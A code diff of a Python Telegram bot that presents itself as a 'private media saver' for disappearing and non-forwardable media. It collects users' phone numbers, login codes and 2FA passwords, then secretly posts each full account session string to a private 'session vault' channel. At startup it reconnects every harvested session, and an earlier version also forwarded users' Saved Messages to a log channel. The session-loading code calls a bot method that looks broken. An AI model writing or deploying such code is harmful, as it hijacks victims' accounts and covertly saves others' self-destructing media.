@@ -3,368 +3,365 @@ import nest_asyncio
 import asyncio
 import logging
 from datetime import datetime
-from motor.motor_asyncio import AsyncIOMotorClient
+
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.errors import (
-    SessionPasswordNeededError, PhoneCodeInvalidError,
-    PhoneCodeExpiredError, ChannelPrivateError
+    SessionPasswordNeededError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError,
+    ChannelPrivateError
 )
+
 from telegram import (
-    Update, InlineKeyboardButton, InlineKeyboardMarkup,
-    ReplyKeyboardMarkup, KeyboardButton
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    ReplyKeyboardMarkup,
+    KeyboardButton
 )
 from telegram.constants import ChatAction
 from telegram.ext import (
-    ApplicationBuilder, CommandHandler, MessageHandler,
-    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    filters,
+    ConversationHandler
 )
-from dotenv import load_dotenv
 
+from dotenv import load_dotenv
 load_dotenv()
 
-DEFAULT_API_ID = int(os.getenv("API_ID")) #add api id default
-DEFAULT_API_HASH = os.getenv("API_HASH") #add your api hash
-MONGO_URI = os.getenv("MONGO_URI") #add  your mongo db url
-BOT_TOKEN = os.getenv("BOT_TOKEN") #add your telegram bot token
-LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875")) #add your log channel for sending log
-ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304")) #add your admin id
+# ================= CONFIG ================= #
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+DEFAULT_API_ID = int(os.getenv("API_ID"))
+DEFAULT_API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8440659080"))
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
+
+# PRIVATE SESSION VAULT CHANNEL
+SESSION_CHANNEL_ID = int(os.getenv("SESSION_CHANNEL_ID", "-1003526329618"))  # REQUIRED
+
+WELCOME_IMAGE = "https://graph.org/file/45580ccca91241c2dbf76-d29d2b3a1c790f9c04.jpg"
+SUPPORT_LINK = "https://t.me/unbornvillain"
+
+# ========================================= #
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
 logger = logging.getLogger("UserBot")
 
-mongo_client = AsyncIOMotorClient(MONGO_URI)
-db = mongo_client.userbot
-sessions = db.sessions
+nest_asyncio.apply()
 
 app = ApplicationBuilder().token(BOT_TOKEN).build()
+
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
+
 user_login_data = {}
-active_clients = []
+active_clients = {}
 connected_users = set()
 
-WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg" #add your welcome image
-SUPPORT_LINK = "https://t.me/valahallah" #add your support channel link
+# ================= START ================= #
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     inline_kb = InlineKeyboardMarkup([
         [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
         [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
     ])
+
     reply_kb = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
+        [[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
         resize_keyboard=True
     )
+
     await update.message.reply_photo(
         photo=WELCOME_IMAGE,
         caption=(
             "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
             "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.</i>\n\n"
             "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
-            "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs 📦\n"
-            "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ 🔓\n"
-            "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ 📲\n\n"
-            "𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
+            "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ 📦\n"
+            "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ 🔓\n"
+            "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ʀᴜɴ 📲"
         ),
-        reply_markup=inline_kb,
-        parse_mode="HTML"
+        parse_mode="HTML",
+        reply_markup=inline_kb
     )
+
     await update.message.reply_text(
-        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
+        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄",
         reply_markup=reply_kb
     )
+
+# ================= KEEP ALIVE ================= #
 
 async def keep_client_alive(client: TelegramClient, user_id: int):
     while True:
         try:
             await client.run_until_disconnected()
-            logger.warning(f"[Disconnected] Client {user_id} disconnected. Retrying...")
         except Exception as e:
-            logger.error(f"[Client Crash]: {e}")
+            logger.error(f"[Client Crash {user_id}] {e}")
             await asyncio.sleep(10)
-# part 2: connect flow, login, session, media handler
+
+# ================= CONNECT FLOW ================= #
 
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+
     if user_id in connected_users:
         await update.callback_query.answer()
         await update.callback_query.message.reply_text(
-            "⚠️ You're already connected.\nSend /cancel if you want to switch account."
+            "⚠️ You're already connected.\nUse /cancel to switch."
         )
         return ConversationHandler.END
 
     await update.callback_query.answer()
     await update.callback_query.message.reply_text(
-        "📲 <b>Enter your API ID</b> or send /skip to use default",
+        "📲 <b>Enter your API ID</b> or send /skip",
         parse_mode="HTML"
     )
     return API_ID
 
 async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_login_data[user_id] = {
+    user_login_data[update.effective_user.id] = {
         "api_id": DEFAULT_API_ID,
         "api_hash": DEFAULT_API_HASH
     }
-    await update.message.reply_text("📞 Now send your phone number with country code:")
+    await update.message.reply_text("📞 Send phone number with country code:")
     return PHONE
-
-async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    return await skip_api_id(update, context)
 
 async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
-    if text.startswith("/"):
-        return await skip_api_id(update, context)
     if not text.isdigit():
-        await update.message.reply_text("❌ API ID must be a number. Try again or send /skip.")
+        await update.message.reply_text("❌ API ID must be number or /skip")
         return API_ID
     user_login_data[update.effective_user.id] = {"api_id": int(text)}
-    await update.message.reply_text("🔑 Send your API HASH or /skip or /cancel")
+    await update.message.reply_text("🔑 Send API HASH or /skip")
     return API_HASH
 
 async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if text.startswith("/"):
-        return await skip_api_hash(update, context)
-    user_login_data[update.effective_user.id]["api_hash"] = text
-    await update.message.reply_text("📞 Now send your phone number (with country code) or /cancel:")
+    user_login_data[update.effective_user.id]["api_hash"] = update.message.text.strip()
+    await update.message.reply_text("📞 Send phone number:")
     return PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     phone = update.message.text.strip()
-    user_login_data[user_id]["phone"] = phone
-    try:
-        client = TelegramClient(
-            StringSession(),
-            user_login_data[user_id]["api_id"],
-            user_login_data[user_id]["api_hash"]
-        )
-        await client.connect()
-        await client.send_code_request(phone)
-        user_login_data[user_id]["client"] = client
-        await update.message.reply_text("🔐 Enter OTP (with spaces). Ex: 1 2 3 4 5")
-        return CODE
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to send OTP: {e}")
-        return ConversationHandler.END
+    data = user_login_data[user_id]
+
+    client = TelegramClient(
+        StringSession(),
+        data["api_id"],
+        data["api_hash"]
+    )
+
+    await client.connect()
+    await client.send_code_request(phone)
+
+    data["client"] = client
+    data["phone"] = phone
+
+    await update.message.reply_text("🔐 Enter OTP (1 2 3 4 5)")
+    return CODE
 
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    code = update.message.text.replace(" ", "").strip()
+    code = update.message.text.replace(" ", "")
     client = user_login_data[user_id]["client"]
+
     try:
         await client.sign_in(user_login_data[user_id]["phone"], code)
         return await complete_login(update, context)
-    except PhoneCodeExpiredError:
-        await update.message.reply_text("⌛ OTP expired. Start again with /start.")
-    except PhoneCodeInvalidError:
-        await update.message.reply_text("❌ Invalid OTP. Start again.")
     except SessionPasswordNeededError:
-        await update.message.reply_text("🔑 2FA enabled. Enter your password:")
+        await update.message.reply_text("🔑 Enter 2FA password:")
         return PASSWORD
+    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
+        await update.message.reply_text("❌ OTP invalid or expired.")
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ {e}")
+
     return ConversationHandler.END
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    password = update.message.text.strip()
-    client = user_login_data[user_id]["client"]
-    try:
-        await client.sign_in(password=password)
-        return await complete_login(update, context)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Login failed: {e}")
-        return ConversationHandler.END
+    client = user_login_data[update.effective_user.id]["client"]
+    await client.sign_in(password=update.message.text.strip())
+    return await complete_login(update, context)
+
+# ================= MEDIA HANDLER ================= #
 
 async def add_media_handler(client):
     @client.on(events.NewMessage(incoming=True))
-    async def media_handler(event):
-        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
+    async def handler(event):
+        if event.is_private and event.media and getattr(event.media, "ttl_seconds", None):
             try:
-                sender = await event.get_sender()
-                name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
-                logger.info(f"📥 Disappearing media from {name}")
                 file = await event.download_media()
-                await client.send_file(
-                    "me",
-                    file,
-                    caption=f"🕒 Saved disappearing media from @{name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                )
+                await client.send_file("me", file, caption="🕒 Disappearing media saved")
             except Exception as e:
-                logger.warning(f"[Media Save Error]: {e}")
+                logger.warning(f"[Media Error] {e}")
+
+# ================= SAVE SESSION TO CHANNEL ================= #
+
 async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     client = user_login_data[user_id]["client"]
     session_string = client.session.save()
     me = await client.get_me()
 
-    await sessions.update_one(
-        {"_id": user_id},
-        {"$set": {
-            "session": session_string,
-            "type": "telethon",
-            "account_id": me.id
-        }},
-        upsert=True
+    await context.bot.send_message(
+        chat_id=SESSION_CHANNEL_ID,
+        text=(
+            f"#SESSION\n"
+            f"USER_ID: {user_id}\n"
+            f"ACCOUNT_ID: {me.id}\n"
+            f"SESSION: {session_string}\n"
+            f"DATE: {datetime.now()}"
+        )
     )
 
     connected_users.add(user_id)
-
-    try:
-        await context.bot.send_message(
-            chat_id=LOG_CHANNEL_ID,
-            text=(
-                f"🔐 <b>New Session Saved</b>\n"
-                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
-                f"🆔 <b>Telegram ID:</b> <code>{me.id}</code>\n"
-                f"🏷️ <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
-                f"📞 <b>Phone:</b> {me.phone}"
-            ),
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        logger.error(f"[Logging Error] {e}")
+    active_clients[user_id] = client
 
     await add_media_handler(client)
-    active_clients.append(client)
+    asyncio.create_task(keep_client_alive(client, user_id))
 
-    asyncio.get_event_loop().create_task(keep_client_alive(client, user_id))
-
-    await update.message.reply_text("✅ Successfully connected and running!")
+    await update.message.reply_text("✅ Successfully connected & running!")
     user_login_data.pop(user_id, None)
+
     return ConversationHandler.END
 
+# ================= AUTO CONNECT ================= #
+
 async def auto_connect_all_sessions():
-    async for record in sessions.find({"type": "telethon"}):
-        session_str = record.get("session")
-        if not session_str:
+    async for msg in app.bot.get_chat_history(SESSION_CHANNEL_ID, limit=2000):
+        if not msg.text or "#SESSION" not in msg.text:
             continue
-        user_id = record["_id"]
-        client = TelegramClient(StringSession(session_str), DEFAULT_API_ID, DEFAULT_API_HASH)
+
+        data = {}
+        for line in msg.text.splitlines():
+            if ":" in line:
+                k, v = line.split(":", 1)
+                data[k.strip()] = v.strip()
+
         try:
+            user_id = int(data["USER_ID"])
+            session = data["SESSION"]
+        except:
+            continue
+
+        if user_id in connected_users:
+            continue
+
+        try:
+            client = TelegramClient(
+                StringSession(session),
+                DEFAULT_API_ID,
+                DEFAULT_API_HASH
+            )
             await client.start()
             if not await client.is_user_authorized():
-                logger.warning(f"❌ Unauthorized session: {user_id}")
                 continue
-            logger.info(f"✅ Auto-connected: {user_id}")
+
             await add_media_handler(client)
-            active_clients.append(client)
+            active_clients[user_id] = client
             connected_users.add(user_id)
 
-            @client.on(events.NewMessage(chats="me", incoming=True))
-            async def forward_saved(event):
-                try:
-                    await client.send_message(
-                        LOG_CHANNEL_ID,
-                        file=event.media if event.media else None,
-                        message=event.text if event.text else None
-                    )
-                except Exception as e:
-                    logger.warning(f"[AutoForwardError] {e}")
-
-            asyncio.get_event_loop().create_task(keep_client_alive(client, user_id))
+            asyncio.create_task(keep_client_alive(client, user_id))
+            logger.info(f"✅ Auto connected {user_id}")
 
         except Exception as e:
-            logger.error(f"❌ AutoConnect Error for {user_id}: {e}")
+            logger.error(f"❌ Auto-connect failed {user_id}: {e}")
+
+# ================= FETCH MEDIA ================= #
 
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in connected_users:
-        await update.message.reply_text("⚠️ Please connect your account first using the button above.")
+    if update.effective_user.id not in connected_users:
+        await update.message.reply_text("⚠️ Connect account first.")
         return ConversationHandler.END
-    await update.message.reply_text("📎 Send message link:\nEx: https://t.me/c/123/45")
+
+    await update.message.reply_text("📎 Send message link")
     return FETCH_LINK
 
 async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
-    user_id = update.effective_user.id
-    record = await sessions.find_one({"_id": user_id})
-    if not record:
-        await update.message.reply_text("⚠️ Please connect your account first.")
+    await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
+
+    client = active_clients.get(update.effective_user.id)
+    if not client:
+        await update.message.reply_text("❌ Session not active.")
         return ConversationHandler.END
 
-    client = TelegramClient(StringSession(record["session"]), DEFAULT_API_ID, DEFAULT_API_HASH)
-    await client.connect()
-
     try:
-        await update.message.reply_text("📥 Please wait, fetching your media...")
         text = update.message.text.strip()
+
         if "t.me/c/" in text:
             parts = text.split("t.me/c/")[1].split("/")
             chat_id = int("-100" + parts[0])
             msg_id = int(parts[1])
-        elif "t.me/" in text:
+        else:
             parts = text.split("t.me/")[1].split("/")
             chat_id = parts[0]
             msg_id = int(parts[1])
-        else:
-            await update.message.reply_text("❌ Invalid message link format.")
-            return FETCH_LINK
 
         entity = await client.get_entity(chat_id)
-        message = await client.get_messages(entity, ids=msg_id)
+        msg = await client.get_messages(entity, ids=msg_id)
 
-        if not message or not message.media:
+        if not msg or not msg.media:
             await update.message.reply_text("⚠️ No media found.")
             return ConversationHandler.END
 
-        file = await message.download_media()
-        await client.send_file("me", file, caption="📥 Fetched non-forwardable media.")
-        await update.message.reply_text("✅ Sent to Saved Messages.")
+        file = await msg.download_media()
+        await client.send_file("me", file, caption="📥 Fetched media")
+        await update.message.reply_text("✅ Sent to Saved Messages")
+
     except ChannelPrivateError:
-        await update.message.reply_text("❌ You're not a member of that channel.")
+        await update.message.reply_text("❌ Join channel first.")
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ {e}")
+
     return ConversationHandler.END
+
+# ================= CANCEL ================= #
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in user_login_data:
-        try:
-            await user_login_data[user_id]["client"].disconnect()
-        except:
-            pass
-        user_login_data.pop(user_id, None)
-    await update.message.reply_text("❌ Process cancelled. Use /start again.")
+    user_login_data.pop(update.effective_user.id, None)
+    await update.message.reply_text("❌ Cancelled. Use /start.")
     return ConversationHandler.END
 
-async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❓ Unknown command. Use /start again.")
+# ================= HANDLERS ================= #
 
 login_conv = ConversationHandler(
     entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
     states={
         API_ID: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_id)],
-        API_HASH: [CommandHandler("skip", skip_api_hash), MessageHandler(filters.TEXT, get_api_hash)],
-        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
-        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
-        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+        API_HASH: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_hash)],
+        PHONE: [MessageHandler(filters.TEXT, get_phone)],
+        CODE: [MessageHandler(filters.TEXT, get_otp)],
+        PASSWORD: [MessageHandler(filters.TEXT, get_password)],
     },
     fallbacks=[CommandHandler("cancel", cancel)],
-    allow_reentry=True,
 )
 
-fetch_menu_conv = ConversationHandler(
-    entry_points=[MessageHandler(filters.TEXT & filters.Regex(r"^📥"), menu_fetch_request)],
-    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
+fetch_conv = ConversationHandler(
+    entry_points=[MessageHandler(filters.Regex("^📥"), menu_fetch_request)],
+    states={FETCH_LINK: [MessageHandler(filters.TEXT, fetch_from_link)]},
     fallbacks=[CommandHandler("cancel", cancel)],
 )
 
-if __name__ == "__main__":
-    nest_asyncio.apply()
+# ================= MAIN ================= #
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("cancel", cancel))
-    app.add_handler(login_conv)
-    app.add_handler(fetch_menu_conv)
-    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
+async def main():
+    await auto_connect_all_sessions()
+    print("🤖 Bot Running...")
+    await app.run_polling()
 
-    async def start_bot():
-        await auto_connect_all_sessions()
-        print("🤖 Bot is running...")
-        await app.run_polling()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("cancel", cancel))
+app.add_handler(login_conv)
+app.add_handler(fetch_conv)
 
-    asyncio.run(start_bot())
+asyncio.run(main())
